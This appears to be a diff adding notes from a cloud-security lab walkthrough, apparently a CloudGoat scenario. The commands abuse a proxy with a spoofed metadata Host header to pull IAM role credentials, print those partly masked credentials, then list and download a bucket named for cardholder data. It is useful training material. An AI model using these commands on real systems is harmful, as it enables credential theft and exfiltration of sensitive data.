@@ -1,0 +1,19 @@
+1. curl -s http://<ec2_external_IP>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
+cg-banking-WAF-Role-cgid2odf2492zi
+
+2. curl http://<ec2_external_IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid2odf2492zi -H 'Host:169.254.169.254'
+
+3. aws configure --profile erratic
+
+cat ~/.aws/credentials 
+[erratic]
+aws_access_key_id = ASIA4N6NG6O3XXXXXXXX
+aws_secret_access_key = jPOJ2ffokGMIeQxhSzYvIAEAFb1HmqLeXXXXXXXX
+aws_session_token = IQoJb3JpZ2luX2VjEH0aCXVzLWVhc3QtMSJHMEUCIHxRAVsQGO7IYx/c6Bzq6LZXRiRfO/knUVXvMjYmh9AOAiEAuPbWCe34RISQo2ze7qtQ56zd8rNCZBVr4f3Kdme8a9Iq+gMINhAAGgw4NTQ1OTE5OTI3NTgiDHQm3w439pEJA4ekYyrXA1C2yVyDRv1IY45tz/CYkOEuNTTyzZcc04Ctw0cwmx0AvIeNiQOYovWiB2WYKFZgKVvanQ+i64yHmwjfM2nsL6w1M+dCahPm591vG8HJhNQ+2aLe6QGZmWbhpX6fIfl+7KC1uxZ4RpECvaRsyZUpcfv8Muei+whJcmYL7IICrcdg0jV0ZB4LBZ7gFGM8WbKm2YIJk2zouoFPAm4jIZgWWEDjh1y+w4PUZ/1rqeqy2IeS/XlzE57lO1AlYVz8Hv8v4okJAb9ED46UEbAGGf+lt6ZtJQGbYyMQE2ojfSpUk3o2k7paY52j8gIHhefntsi1wz/oeYFXqu3EDxGswx0YXK3fWAOUZzsquJfPOpQewqIfCHk4pGvtzd3GlERbIwU3LIedVUa9FtosOTynMeGT1fmu0LDJ7HaY2sATaCdwB2JtiMui1KGO4Ulg6sheahDzF9sXKs6J6sfu/zSpz8W2LlCbGwJoBXPycbfVJfl441ItPnnftPKr8gcyY0/pmr08Tew1RH3MLS93Wa0CgVFYT9HFvjD9ykIcn4u+nc8eYt5Ck4JhAWCdZ7Y20PG93JUHQbYT2R5IQOc+iPEiz5PfJNXHduZTLpkg/NaorF2EtVPsHA4EBpGJtTDqwO+FBjqlAS7WJVnp237g9ZnE23SRfP0qwUx3r4EG896fK1cNkbXwnimG2R567h4jtCYTbqUo7zlKGdeV4y+b/IaYAH4dXW+0S4n7WIaDCYF9xA+bdcST4OgiAvweMLbF+sSCpXNTJ6otRpVHMMY8Y2XkZ7DQStZu312J9gtKTUCrHlIQQf/xABfwK1dBUKNp7ZiyUUx52Xp/tsDGPdrfNEAxO9GLcdXXXXXXXX==
+
+
+4. aws s3 ls --profile erratic
+cg-cardholder-data-bucket-cgid2odf2492zi
+
+5. aws s3 sync s3://cg-cardholder-data-bucket-cgid2odf2492zi ./cardholder-data --profile erratic
+got all the files in the s3 bucket
